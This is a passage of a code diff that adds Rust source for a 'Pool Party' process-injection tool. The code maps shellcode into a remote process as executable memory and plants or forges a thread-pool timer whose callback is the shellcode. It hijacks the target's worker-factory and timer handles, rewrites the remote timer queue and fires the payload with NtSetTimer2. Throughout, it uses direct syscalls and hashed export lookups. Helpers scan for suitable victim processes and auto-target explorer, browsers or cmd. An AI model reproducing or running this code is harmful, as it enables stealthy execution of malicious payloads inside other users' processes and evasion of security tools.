+    let mut local_view_size: usize = 0;
+
+    let status = syscall!(
+        NT_MAP_VIEW_OF_SECTION,
+        NtMapViewOfSectionFn,
+        section_handle,
+        -1isize,  // Current process
+        &mut local_addr,
+        0,  // ZeroBits
+        0,  // CommitSize
+        null_mut(),  // SectionOffset
+        &mut local_view_size,
+        VIEW_UNMAP,  // InheritDisposition
+        0,  // AllocationType
+        PAGE_READWRITE  // Win32Protect
+    );
+
+    if status != 0 {
+        debug_println!("[-] NtMapViewOfSection (local) failed: {:#x}", status);
+        return status;
+    }
+    debug_println!("[+] Local view at: {:?} (size: {} bytes)", local_addr, local_view_size);
+
+    // Step 4: Copy shellcode to local view (simple memcpy!)
+    debug_println!("\n[*] Step 4: Copying shellcode to local view...");
+
+    unsafe {
+        copy_nonoverlapping(
+            shellcode.as_ptr(),
+            local_addr as *mut u8,
+            shellcode.len()
+        );
+    }
+
+    debug_println!("[+] Shellcode copied via memcpy");
+
+    // Step 5: Map section into remote process (as PAGE_EXECUTE_READ)
+    debug_println!("\n[*] Step 5: Mapping section into remote process...");
+
+    let mut remote_addr: *mut c_void = null_mut();
+    let mut remote_view_size: usize = 0;
+
+    let status = syscall!(
+        NT_MAP_VIEW_OF_SECTION,
+        NtMapViewOfSectionFn,
+        section_handle,
+        process_handle,  // Remote process
+        &mut remote_addr,
+        0,  // ZeroBits
+        0,  // CommitSize
+        null_mut(),  // SectionOffset
+        &mut remote_view_size,
+        VIEW_UNMAP,  // InheritDisposition
+        0,  // AllocationType
+        PAGE_EXECUTE_READ  // Win32Protect - executable for shellcode
+    );
+
+    if status != 0 {
+        debug_println!("[-] NtMapViewOfSection (remote) failed: {:#x}", status);
+        return status;
+    }
+    debug_println!("[+] Remote view at: {:?} (size: {} bytes, PAGE_EXECUTE_READ)", remote_addr, remote_view_size);
+
+    // Step 6: Get CreateThreadpoolTimer from kernel32 (preferred) or TpAllocTimer from ntdll (fallback)
+    debug_println!("\n[*] Step 6: Resolving thread pool functions...");
+
+    let create_timer_addr = unsafe { get_kernel32_export(CREATE_THREADPOOL_TIMER) };
+    let alloc_timer_fn_addr = if create_timer_addr.is_some() {
+        debug_println!("[+] Using kernel32: CreateThreadpoolTimer at: {:?}", create_timer_addr.unwrap());
+        create_timer_addr.unwrap()
+    } else {
+        debug_println!("[-] kernel32 CreateThreadpoolTimer not found, trying ntdll TpAllocTimer...");
+        let tp_alloc_addr = unsafe { get_ntdll_export(TP_ALLOC_TIMER) };
+        if tp_alloc_addr.is_none() {
+            debug_println!("[-] Failed to resolve any timer allocation function");
+            return -1;
+        }
+        debug_println!("[+] Using ntdll: TpAllocTimer at: {:?}", tp_alloc_addr.unwrap());
+        tp_alloc_addr.unwrap()
+    };
+
+    // Also get SetThreadpoolTimer or TpSetTimer
+    let set_timer_addr = unsafe { get_kernel32_export(SET_THREADPOOL_TIMER) };
+    let tp_set_timer_addr = if let Some(addr) = set_timer_addr {
+        debug_println!("[+] Using kernel32: SetThreadpoolTimer at: {:?}", addr);
+        addr
+    } else {
+        debug_println!("[-] kernel32 SetThreadpoolTimer not found, trying ntdll TpSetTimer...");
+        let tp_set_addr = unsafe { get_ntdll_export(TP_SET_TIMER) };
+        if tp_set_addr.is_none() {
+            debug_println!("[-] Failed to resolve any timer set function");
+            return -1;
+        }
+        debug_println!("[+] Using ntdll: TpSetTimer at: {:?}", tp_set_addr.unwrap());
+        tp_set_addr.unwrap()
+    };
+
+    // Step 7: Create a real TP_TIMER locally
+    debug_println!("\n[*] Step 7: Creating TP_TIMER locally...");
+
+    let tp_alloc_timer: TpAllocTimerFn = unsafe { core::mem::transmute(alloc_timer_fn_addr) };
+
+    // Cast shellcode address to callback type (this will be our callback in the LOCAL timer)
+    let callback_ptr = remote_addr; // Remote shellcode address used as callback
+
+    debug_println!("[*] Attempting to call TpAllocTimer...");
+    debug_println!("[*]   Callback will be set to shellcode: {:?}", callback_ptr);
+    debug_println!("[*]   Context: null");
+    debug_println!("[*]   Environment: null");
+
+    // Try to create the timer - if this crashes, we'll know
+    let local_timer_ptr = unsafe {
+        tp_alloc_timer(
+            core::mem::transmute(callback_ptr), // Use remote shellcode addr as callback
+            null_mut(), // Context
+            null_mut()  // Environment (NULL means use default)
+        )
+    };
+
+    if local_timer_ptr.is_null() {
+        debug_println!("[-] TpAllocTimer returned NULL");
+        debug_println!("[*] Falling back to manual construction approach...");
+
+        // Manual construction fallback
+        let timer_size = 0x100;
+        let mut timer_buffer = alloc::vec![0u8; timer_size];
+        const CALLBACK_OFFSET: usize = 0x28;
+
+        unsafe {
+            core::ptr::write_unaligned(
+                (timer_buffer.as_mut_ptr() as usize + CALLBACK_OFFSET) as *mut usize,
+                remote_addr as usize
+            );
+        }
+
+        let mut timer_remote_addr: *mut c_void = null_mut();
+        let mut timer_region_size = timer_size;
+
+        let status = syscall!(
+            NT_ALLOCATE_VIRTUAL_MEMORY,
+            NtAllocateVirtualMemoryFn,
+            process_handle,
+            &mut timer_remote_addr,
+            0,
+            &mut timer_region_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE
+        );
+
+        if status != 0 {
+            debug_println!("[-] Failed to allocate memory for TP_TIMER: {:#x}", status);
+            return status;
+        }
+
+        let mut bytes_written: usize = 0;
+        let status = syscall!(
+            NT_WRITE_VIRTUAL_MEMORY,
+            NtWriteVirtualMemoryFn,
+            process_handle,
+            timer_remote_addr,
+            timer_buffer.as_ptr() as *const c_void,
+            timer_size,
+            &mut bytes_written
+        );
+
+        if status != 0 {
+            debug_println!("[-] Failed to write TP_TIMER: {:#x}", status);
+            return status;
+        }
+
+        debug_println!("[+] Manual TP_TIMER written to remote process");
+
+        let tp_set_timer: TpSetTimerFn = unsafe { core::mem::transmute(tp_set_timer_addr) };
+        let remote_timer: PTP_TIMER = timer_remote_addr as PTP_TIMER;
+        let due_time: i64 = -100;
+
+        unsafe { tp_set_timer(remote_timer, &due_time, 0, 0); }
+
+        debug_println!("[+] Timer triggered with manual structure!");
+
+        debug_println!("\n=== TP_TIMER Pool Party Injection Complete! ===");
+        debug_println!("[+] Shellcode at: {:?} in remote process", remote_addr);
+        debug_println!("[+] TP_TIMER at: {:?} in remote process", timer_remote_addr);
+        debug_println!("[+] Used manual TP_TIMER construction (fallback)");
+
+        return 0;
+    }
+
+    debug_println!("[+] TpAllocTimer succeeded! Timer at: {:?}", local_timer_ptr);
+
+    // Step 8-9: Hijack Worker Factory handle from target process (optional)
+    debug_println!("\n[*] Step 8: Hijacking Worker Factory handle from target process...");
+
+    let duplicated_wf_handle = hijack_worker_factory_handle(process_handle);
+    let remote_tp_pool = if let Some(wf_handle) = duplicated_wf_handle {
+        debug_println!("[+] Worker Factory handle hijacked: {:#x}", wf_handle);
+
+        // Step 10: Query Worker Factory to get TP_POOL address
+        debug_println!("\n[*] Step 10: Querying Worker Factory for TP_POOL address...");
+
+        let mut wf_info: WORKER_FACTORY_BASIC_INFORMATION = unsafe { core::mem::zeroed() };
+        let mut return_length: u32 = 0;
+
+        let status = syscall!(
+            NT_QUERY_INFORMATION_WORKER_FACTORY,
+            NtQueryInformationWorkerFactoryFn,
+            wf_handle,
+            WORKER_FACTORY_BASIC_INFORMATION_CLASS,
+            &mut wf_info as *mut _ as *mut c_void,
+            core::mem::size_of::<WORKER_FACTORY_BASIC_INFORMATION>() as u32,
+            &mut return_length
+        );
+
+        if status != 0 {
+            debug_println!("[-] NtQueryInformationWorkerFactory failed: {:#x}", status);
+            debug_println!("[*] Continuing without TP_POOL");
+            core::ptr::null_mut()
+        } else {
+            debug_println!("[+] Remote TP_POOL address: {:?}", wf_info.StartParameter);
+            wf_info.StartParameter
+        }
+    } else {
+        debug_println!("[-] No Worker Factory handle found");
+        debug_println!("[*] Continuing without TP_POOL (simpler injection method)");
+        core::ptr::null_mut()
+    };
+
+    // Step 11-12: Hijack Timer handle from target process (optional for NtSetTimer2)
+    debug_println!("\n[*] Step 11: Hijacking Timer handle from target process...");
+
+    let duplicated_timer_handle = hijack_timer_handle(process_handle);
+    if let Some(timer_handle) = duplicated_timer_handle {
+        debug_println!("[+] Timer handle hijacked: {:#x}", timer_handle);
+    } else {
+        debug_println!("[-] No Timer handle found");
+        debug_println!("[*] Will attempt injection without duplicated timer");
+    }
+
+    // Step 13: Modify TP_TIMER structure
+    debug_println!("\n[*] Step 13: Modifying TP_TIMER structure...");
+
+    let local_timer = unsafe { &mut *(local_timer_ptr as *mut FULL_TP_TIMER) };
+    let timeout: i64 = -10000000; // 1 second (negative = relative time in 100ns units)
+
+    // Set Pool to remote TP_POOL if available
+    if !remote_tp_pool.is_null() {
+        local_timer.Work.CleanupGroupMember.Pool = remote_tp_pool as *mut FULL_TP_POOL;
+        debug_println!("[+] Timer Pool set to remote TP_POOL: {:?}", remote_tp_pool);
+    } else {
+        debug_println!("[*] No TP_POOL available, using simpler method");
+    }
+
+    local_timer.DueTime = timeout;
+    local_timer.WindowStartLinks.Key = timeout;
+    local_timer.WindowEndLinks.Key = timeout;
+
+    debug_println!("[+] DueTime set to: {}", timeout);
+
+    // Step 14: Allocate memory for TP_TIMER in remote process
+    debug_println!("\n[*] Step 14: Allocating TP_TIMER in remote process...");
+
+    let mut timer_remote_addr: *mut c_void = null_mut();
+    let mut timer_region_size = core::mem::size_of::<FULL_TP_TIMER>();
+
+    let status = syscall!(
+        NT_ALLOCATE_VIRTUAL_MEMORY,
+        NtAllocateVirtualMemoryFn,
+        process_handle,
+        &mut timer_remote_addr,
+        0,
+        &mut timer_region_size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE
+    );
+
+    if status != 0 {
+        debug_println!("[-] NtAllocateVirtualMemory failed: {:#x}", status);
+        return status;
+    }
+    debug_println!("[+] Remote TP_TIMER allocated at: {:?}", timer_remote_addr);
+
+    let remote_timer = timer_remote_addr as *mut FULL_TP_TIMER;
+
+    // Fix up WindowStartLinks and WindowEndLinks to point to remote addresses
+    unsafe {
+        let remote_window_start = &mut (*remote_timer).WindowStartLinks as *mut RTL_BALANCED_NODE_WITHKEY;
+        let remote_window_end = &mut (*remote_timer).WindowEndLinks as *mut RTL_BALANCED_NODE_WITHKEY;
+
+        // Initialize the node children to point to themselves (required for RB-tree)
+        local_timer.WindowStartLinks.Node.Children[0] = remote_window_start as *mut RTL_BALANCED_NODE;
+        local_timer.WindowStartLinks.Node.Children[1] = remote_window_start as *mut RTL_BALANCED_NODE;
+        local_timer.WindowEndLinks.Node.Children[0] = remote_window_end as *mut RTL_BALANCED_NODE;
+        local_timer.WindowEndLinks.Node.Children[1] = remote_window_end as *mut RTL_BALANCED_NODE;
+    }
+
+    debug_println!("[+] Timer links fixed up for remote addresses");
+
+    // Step 15: Write modified TP_TIMER to remote process
+    debug_println!("\n[*] Step 15: Writing TP_TIMER to remote process...");
+
+    let mut bytes_written: usize = 0;
+    let status = syscall!(
+        NT_WRITE_VIRTUAL_MEMORY,
+        NtWriteVirtualMemoryFn,
+        process_handle,
+        timer_remote_addr,
+        local_timer as *const _ as *const c_void,
+        core::mem::size_of::<FULL_TP_TIMER>(),
+        &mut bytes_written
+    );
+
+    if status != 0 {
+        debug_println!("[-] NtWriteVirtualMemory (timer) failed: {:#x}", status);
+        return status;
+    }
+    debug_println!("[+] TP_TIMER written to remote process ({} bytes)", bytes_written);
+
+    // Step 16: Hijack remote TP_POOL's timer queue (only if we have TP_POOL)
+    if !remote_tp_pool.is_null() {
+        debug_println!("\n[*] Step 16: Hijacking remote TP_POOL timer queue...");
+        debug_println!("[*] Remote TP_POOL base: {:#x}", remote_tp_pool as usize);
+        debug_println!("[*] Remote TP_TIMER location: {:#x}", remote_timer as usize);
+
+        // Calculate address of WindowStart.Root in remote TP_POOL
+        // FULL_TP_POOL: _padding[0x160] + TimerQueue
+        // TimerQueue offset = 0x160
+        let window_start_root_addr = (remote_tp_pool as usize + 0x160) as *mut *mut RTL_BALANCED_NODE;
+
+        let timer_window_start_ptr = unsafe {
+            &mut (*remote_timer).WindowStartLinks.Node as *mut RTL_BALANCED_NODE
+        };
+
+        debug_println!("[*] WindowStart.Root location: {:#x}", window_start_root_addr as usize);
+        debug_println!("[*] Writing pointer to timer WindowStartLinks.Node: {:#x}", timer_window_start_ptr as usize);
+
+        let status = syscall!(
+            NT_WRITE_VIRTUAL_MEMORY,
+            NtWriteVirtualMemoryFn,
+            process_handle,
+            window_start_root_addr as *mut c_void,
+            &timer_window_start_ptr as *const _ as *const c_void,
+            core::mem::size_of::<*mut RTL_BALANCED_NODE>(),
+            &mut bytes_written
+        );
+
+        if status != 0 {
+            debug_println!("[-] Failed to hijack WindowStart.Root: {:#x}", status);
+            debug_println!("[*] Continuing without queue hijacking");
+        } else {
+            debug_println!("[+] WindowStart.Root hijacked");
+
+            // Calculate address of WindowEnd.Root
+            let window_end_root_addr = (remote_tp_pool as usize + 0x160 + 0x10) as *mut *mut RTL_BALANCED_NODE;
+
+            let timer_window_end_ptr = unsafe {
+                &mut (*remote_timer).WindowEndLinks.Node as *mut RTL_BALANCED_NODE
+            };
+
+            debug_println!("[*] WindowEnd.Root location: {:#x}", window_end_root_addr as usize);
+            debug_println!("[*] Writing pointer to timer WindowEndLinks.Node: {:#x}", timer_window_end_ptr as usize);
+
+            let status = syscall!(
+                NT_WRITE_VIRTUAL_MEMORY,
+                NtWriteVirtualMemoryFn,
+                process_handle,
+                window_end_root_addr as *mut c_void,
+                &timer_window_end_ptr as *const _ as *const c_void,
+                core::mem::size_of::<*mut RTL_BALANCED_NODE>(),
+                &mut bytes_written
+            );
+
+            if status != 0 {
+                debug_println!("[-] Failed to hijack WindowEnd.Root: {:#x}", status);
+            } else {
+                debug_println!("[+] WindowEnd.Root hijacked");
+                debug_println!("[+] Timer queue successfully hijacked!");
+            }
+        }
+    } else {
+        debug_println!("\n[*] Step 16: Skipping queue hijacking (no TP_POOL)");
+        debug_println!("[*] Will rely on NtSetTimer2 alone to trigger execution");
+    }
+
+    // Step 17: Trigger timer execution with NtSetTimer2
+    debug_println!("\n[*] Step 17: Triggering timer with NtSetTimer2...");
+
+    // Use the duplicated timer handle if available, otherwise use local timer pointer as handle
+    let timer_handle_to_set = if let Some(dup_handle) = duplicated_timer_handle {
+        debug_println!("[*] Using hijacked timer handle from target: {:#x}", dup_handle);
+        dup_handle
+    } else {
+        debug_println!("[*] Using local timer handle: {:#?}", local_timer_ptr);
+        // Use local timer pointer as handle (this might work in some cases)
+        local_timer_ptr as isize
+    };
+
+    let due_time: i64 = -10000000; // 1 second (negative = relative time)
+    let t2_params = T2_SET_PARAMETERS {
+        Version: 0,
+        Reserved: 0,
+        NoWakeTolerance: 0,
+    };
+
+    let status = syscall!(
+        NT_SET_TIMER2,
+        NtSetTimer2Fn,
+        timer_handle_to_set,
+        &due_time as *const i64,
+        core::ptr::null(), // No period (one-shot timer)
+        &t2_params as *const T2_SET_PARAMETERS
+    );
+
+    if status == 0 {
+        debug_println!("[+] NtSetTimer2 succeeded!");
+        debug_println!("[*] Timer set to fire in 1 second...");
+        debug_println!("[*] Waiting for shellcode execution...");
+        debug_println!("[!] Check if calc.exe appears in Task Manager!");
+
+        // Sleep for 5 seconds to let the timer fire and shellcode execute
+        unsafe {
+            let kernel32 = get_kernel32_handle().unwrap();
+            let sleep_addr = get_kernel32_export(hash_it!("Sleep")).unwrap();
+            let sleep_fn: extern "system" fn(u32) = core::mem::transmute(sleep_addr);
+            debug_println!("[*] Sleeping for 10 seconds to allow execution...");
+            sleep_fn(10000);
+        }
+    } else {
+        debug_println!("[-] NtSetTimer2 failed: {:#x}", status);
+        debug_println!("[*] Timer may still fire naturally or on next timer queue processing");
+    }
+
+    debug_println!("\n=== Pool Party Setup Complete ===");
+    debug_println!("[+] Shellcode mapped at: {:?}", remote_addr);
+    debug_println!("[+] TP_TIMER created and modified");
+
+    if !remote_tp_pool.is_null() {
+        debug_println!("[+] Timer queue hijacked - injection ready!");
+        0 // Success
+    } else {
+        debug_println!("[*] No TP_POOL - using simpler method");
+        0 // Still return success since setup is complete
+    }
+}
+
+/// Find all processes that have Worker Factory handles (suitable for Pool Party)
+pub unsafe fn find_processes_with_worker_factory() {
+    debug_println!("\n=== Scanning for Processes with Worker Factory ===");
+
+    let mut buffer_size: u32 = 1024 * 1024 * 2;
+    let mut buffer = alloc::vec![0u8; buffer_size as usize];
+    let mut return_length: u32 = 0;
+
+    let status = syscall!(
+        NT_QUERY_SYSTEM_INFORMATION,
+        NtQuerySystemInformationFn,
+        SYSTEM_HANDLE_INFORMATION_CLASS,
+        buffer.as_mut_ptr() as *mut c_void,
+        buffer_size,
+        &mut return_length
+    );
+
+    if status != 0 {
+        debug_println!("[-] NtQuerySystemInformation failed: {:#x}", status);
+        return;
+    }
+
+    let handle_info = &*(buffer.as_ptr() as *const SYSTEM_HANDLE_INFORMATION);
+    let num_handles = handle_info.NumberOfHandles;
+
+    // Count Worker Factory handles per process
+    let mut wf_by_process = alloc::collections::BTreeMap::new();
+
+    let handles_ptr = &handle_info.Handles as *const SYSTEM_HANDLE_TABLE_ENTRY_INFO;
+    for i in 0..num_handles as isize {
+        let entry = &*(handles_ptr.offset(i));
+
+        if entry.ObjectTypeIndex == OBJECT_TYPE_WORKER_FACTORY as u8 {
+            *wf_by_process.entry(entry.ProcessId as u32).or_insert(0) += 1;
+        }
+    }
+
+    if wf_by_process.is_empty() {
+        debug_println!("[-] No processes with Worker Factory handles found");
+        return;
+    }
+
+    debug_println!("[+] Found {} processes with Worker Factory handles:", wf_by_process.len());
+
+    for (pid, count) in wf_by_process.iter() {
+        // Try to get process name
+        let name = find_process_name(*pid).unwrap_or_else(|| alloc::string::String::from("Unknown"));
+        debug_println!("    PID {}: {} Worker Factory handles - {}",
+            pid, count, name);
+    }
+
+    debug_println!("\n[*] Tip: Target one of these processes for Pool Party injection!");
+}
+
+/// Helper to get process name from PID
+unsafe fn find_process_name(target_pid: u32) -> Option<alloc::string::String> {
+    let mut buffer_size = 1024 * 512;
+    let mut buffer = alloc::vec![0u8; buffer_size];
+    let mut return_length: u32 = 0;
+
+    let mut status = syscall!(
+        NT_QUERY_SYSTEM_INFORMATION,
+        NtQuerySystemInformationFn,
+        SYSTEM_PROCESS_INFORMATION_CLASS,
+        buffer.as_mut_ptr() as *mut c_void,
+        buffer_size as u32,
+        &mut return_length
+    );
+
+    if status != 0 {
+        return None;
+    }
+
+    let mut current_ptr = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;
+
+    loop {
+        let current = &*current_ptr;
+
+        if current.UniqueProcessId as u32 == target_pid {
+            if !current.ImageName.Buffer.is_null() && current.ImageName.Length > 0 {
+                let name_len = (current.ImageName.Length / 2) as usize;
+                let name_slice = core::slice::from_raw_parts(
+                    current.ImageName.Buffer,
+                    name_len
+                );
+
+                let mut name_buf = alloc::vec![0u8; name_len];
+                for (i, &c) in name_slice.iter().enumerate() {
+                    name_buf[i] = if c < 128 { c as u8 } else { b'?' };
+                }
+
+                if let Ok(name) = core::str::from_utf8(&name_buf) {
+                    return Some(alloc::string::String::from(name));
+                }
+            }
+            return None;
+        }
+
+        if current.NextEntryOffset == 0 {
+            break;
+        }
+
+        current_ptr = (current_ptr as usize + current.NextEntryOffset as usize) as *const SYSTEM_PROCESS_INFORMATION;
+    }
+
+    None
+}
+
+/// Convenience function: Auto-detect target process and inject
+/// Searches for common processes (explorer.exe, edge, firefox, cmd)
+pub unsafe fn inject_auto_target(shellcode: &[u8]) -> i32 {
+    debug_println!("\n=== Pool Party Auto-Target Injection ===");
+
+    // Try to find a suitable target process
+    let pid = match unsafe { find_target_process() } {
+        Some(p) => p,
+        None => {
+            debug_println!("[-] No target process found");
+            debug_println!("[*] You can specify a PID manually using inject_via_tp_timer(pid, shellcode)");
+            return -1;
+        }
+    };
+
+    // Perform the injection
+    unsafe { inject_via_tp_timer(pid, shellcode) }
+}
